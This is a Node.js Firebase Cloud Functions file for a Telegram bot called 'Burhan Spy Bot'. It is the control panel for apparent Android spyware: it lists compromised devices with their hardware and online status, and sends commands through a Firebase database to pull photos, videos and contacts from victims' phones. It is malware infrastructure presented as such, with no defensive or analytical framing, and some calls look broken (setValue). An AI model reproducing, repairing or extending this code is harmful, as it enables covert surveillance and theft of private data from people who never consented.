const functions = require('firebase-functions');
const admin = require('firebase-admin');
const TelegramBot = require('node-telegram-bot-api');

admin.initializeApp();
const db = admin.database();

const token = process.env.TOKEN; // Railway/Cloud me set kiya hoga
const YOUR_USER_ID = 2062068620; // Teri ID
const bot = new TelegramBot(token, { polling: false });

// 1. DEVICES LIST
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
        
        const online = Object.entries(devices).filter(([id, d]) => d.online === true);
        const offline = Object.entries(devices).filter(([id, d]) => d.online !== true);
        
        message += "🟢 ONLINE (" + online.length + "):\n";
        online.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n🔑 Key: ${d.deviceName || 'N/A'}\n📅 Expiry: ${d.expiry || 'N/A'}\n📱 Android: ${d.android || 'N/A'}\n💾 RAM: ${d.ram || 'N/A'} MB\n📦 Storage: ${d.storage || 'N/A'} GB\n🔋 Battery: ${d.battery || 'N/A'}%\n📊 Status: 🟢 ONLINE\n🕒 ${d.time || 'N/A'}\n\n`;
        });
        
        message += "\n🔴 OFFLINE (" + offline.length + "):\n";
        offline.forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n🔑 Key: ${d.deviceName || 'N/A'}\n📅 Expiry: ${d.expiry || 'N/A'}\n📱 Android: ${d.android || 'N/A'}\n💾 RAM: ${d.ram || 'N/A'} MB\n📦 Storage: ${d.storage || 'N/A'} GB\n🔋 Battery: ${d.battery || 'N/A'}%\n📊 Status: 🔴 OFFLINE\n🕒 ${d.time || 'N/A'}\n\n`;
        });
        
        bot.sendMessage(chatId, message);
    });
});

// 2. STATS
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
    });
});

// 3. GET PHOTO
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    const photoPath = match[2];
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    db.ref('commands').child(deviceId).setValue('get_photo');
    bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`);
});

// 4. GET VIDEO
bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    const videoPath = match[2];
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    db.ref('commands').child(deviceId).setValue('get_video');
    bot.sendMessage(chatId, `📹 Video request sent for device ${deviceId}...`);
});

// 5. CONTACTS
bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    db.ref('commands').child(deviceId).setValue('get_contacts');
    bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`);
});

// 6. PING
bot.onText(/\/ping (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const deviceId = match[1];
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    db.ref('commands').child(deviceId).setValue('ping');
    bot.sendMessage(chatId, `📡 Ping sent for device ${deviceId}...`);
});

// 7. HELP
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    bot.sendMessage(chatId, `📜 **HELP MENU**\n\n🟢 /devices - List all devices\n🟢 /stats - Total devices\n🟢 /getphoto <ID> <PATH> - Get photo\n🟢 /getvideo <ID> <PATH> - Get video\n🟢 /contacts <ID> - Get contacts\n🟢 /ping <ID> - Check device alive\n🟢 /help - Show this menu`);
});

// 8. START
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
    
    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/stats - Total devices\n/getphoto - Get Photo\n/getvideo - Get Video\n/contacts - Fetch contacts\n/ping - Check device alive\n/help - Commands ka format`);
});

// 9. WEBHOOK RECEIVER
exports.telegramWebhook = functions.https.onRequest((req, res) => {
    bot.processUpdate(req.body);
    res.status(200).send("OK");
});

// 10. SET WEBHOOK
exports.setWebhook = functions.https.onRequest(async (req, res) => {
    await bot.setWebHook(`https://${process.env.GCLOUD_REGION}-${process.env.PROJECT_ID}.cloudfunctions.net/telegramWebhook`);
    res.status(200).send("Webhook set");
});
